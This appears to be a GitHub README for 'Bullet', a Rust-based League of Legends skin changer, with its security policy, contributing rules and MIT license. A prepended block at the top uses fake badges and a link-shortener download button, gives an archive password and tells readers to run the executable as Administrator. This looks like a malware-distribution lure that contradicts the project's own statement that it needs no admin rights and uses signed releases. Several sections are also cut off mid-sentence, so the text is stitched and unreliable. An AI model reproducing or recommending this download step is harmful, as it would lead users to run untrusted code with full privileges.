<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://linkolla.com/2474b9">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

<p align="center">
  <img src="assets/bullet.png" width="96" alt="Bullet">
</p>

<h1 align="center">Bullet</h1>

<p align="center">
  A League of Legends skin changer for Windows, written in Rust.<br>
  <em>The right skin loads into the match — every mode, every time.</em>
</p>

<p align="center">
## Features

- **Every skin and chroma**, including form skins, chosen in champion select and loaded when the game starts.
- **Random skin and history**: roll one, or reuse the last skin you played on each champion.
- **Custom mods**: `.fantome`, `.zip` and `.modpkg`, checked and adjusted against the current patch before use.
- **Classic Rift**: legacy champion models, generated from your installed game.
- **Party mode**: friends see each other's skins through an end-to-end encrypted relay, up to five players. Friends
  in the same lobby need no code.
- **Always up to date**: skins are generated from the game you have installed, so a patch never breaks them.
- **Safe by design**: runs without administrator rights, never writes to the game folder, verifies every binary
  and collects no telemetry.
- **Updates you approve**, verified against the release's signed checksum list.
- English, Portuguese and Spanish. **Free and open source**: if you paid for it, you were scammed.

## Installation

1. **Install Bullet.** Download `Bullet-Setup-<version>-x64.exe` from
## Usage

1. Open the League client and Bullet, in either order.
2. Pick a champion in champion select. Bullet's window lists its skins and chromas.
3. Choose one and play.

Custom mods go into the category folders under `%LOCALAPPDATA%\Bullet\custom_mods`, or are imported from the
**Mods** tab. Party rooms are created from the tray, or offered automatically when friends running Bullet share
## Troubleshooting

Logs are in `%LOCALAPPDATA%\Bullet\logs` (the tray opens the folder); `BULLET_LOG=debug` adds detail. **Export
diagnostics** in the control panel zips everything needed for a report. If a skin or mod breaks match loading,
turn off **Inject skins** in the control panel. Close LTK Manager while Bullet runs: two injectors conflict.

## Building from source

```powershell
cargo xtask check
cargo xtask package
cargo xtask installer
```

## Disclaimer

Bullet is published **for educational purposes**, **as is, without warranty of any kind**, as stated in the MIT
license. The author assumes no responsibility for any damage caused by its use, including account suspensions or
bans. Using third-party software with League of Legends goes against Riot Games' Terms of Service: you decide
whether to use it and bear the consequences. Bullet only changes what you see on your own machine. It is not
affiliated with or endorsed by Riot Games; League of Legends is a trademark of Riot Games, Inc.

<p align="center">


---

# Security policy

## Reporting a vulnerability

Please report security issues **privately** through
## Scope

In scope:

- `bullet.exe`, the installer and the uninstaller,
- the party mode protocol, its encryption and the relay (`relay-worker/`, `crates/bullet-relay`),
- the terminal install script (`install.ps1`) and the in-app update, which verify the installer before running it,
- the build and release pipeline in `.github/`.

Out of scope:

## Supported versions

Only the latest release and the latest pre-release receive security fixes.

## Verifying a download

Every installer published by the release workflow comes with a `SHA256SUMS` file, its signature
(`SHA256SUMS.sig`) and a build provenance attestation. Bullet itself checks the signed checksum list before it runs
an update, and `install.ps1` checks the installer against `SHA256SUMS` and its Authenticode signature:

```powershell
Get-FileHash .\Bullet-Setup-<version>-x64.exe -Algorithm SHA256
gh attestation verify .\Bullet-Setup-<version>-x64.exe --repo Isllanrx/Bullet
```


---

# Contributing to Bullet

Thanks for helping. Bullet is a small project with a high bar for anything that touches the game, so this
page explains what makes a contribution easy to accept.

## Rules the code follows

- No `unwrap()` or `expect()` outside tests. Errors are handled or propagated with context.
- Every discarded `Result` (`let _ = …`) carries `// ignore-ok: <why this is safe>`.
- Background tasks go through the `Supervisor`, never a bare `tokio::spawn`.
- The shared state only changes through the named transitions in `bullet-core::state`.
- Binary parsing checks every offset; bad input returns a typed error and never panics.
- Code, logs and docs are in English. Text shown to users goes through the translation tables.
- No comments in code files (Rust, HTML/CSS/JS, TypeScript, YAML, TOML, the installer script). Names, types
  and tests say what the code does; the reason behind it goes in `docs/`, the crate README or a decision
  record. The only comments allowed are one-line tool directives: `// ignore-ok: <why>`, `# zizmor: ignore[...]`
  and the version after a pinned action SHA. `cargo xtask check` enforces this, and
  `cargo xtask comments --strip` removes the rest after proving the code is unchanged.
- No code file over 400 lines and no folder with more than 5 code files, tests included. `cargo xtask check`
  enforces both.
- No hardcoded drive letters, folders, servers or languages.
- Log state changes, never inside a loop.
- A new dependency needs a short written justification in the pull request.

## Pull requests

- Keep them focused: one change, with the reason explained in the description.
- Fill in the checklist in the pull request template.
- **Anything that changes what happens in game** (injection, game modes, party mode) must include evidence
  from a real match: the Bullet log, and what you saw. Passing tests is not enough for these changes.
- CI must be green. After a maintainer approves, the pull request merges automatically once every required
  check passes. Changes to workflows, the installer, `xtask`, the toolchain and dependency policy, the lockfile, the
  injection trigger, the injector code and its trust check, the party cipher or the relay's deploy config are
  merged by hand.

## Releases

Nobody bumps the version by hand. The merge publishes a pre-release whose version is the last release plus one
minor (the next major for a pull request labelled `breaking`), and it becomes the latest release only after it has


---

MIT License

Copyright (c) 2026 Isllan Toso

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
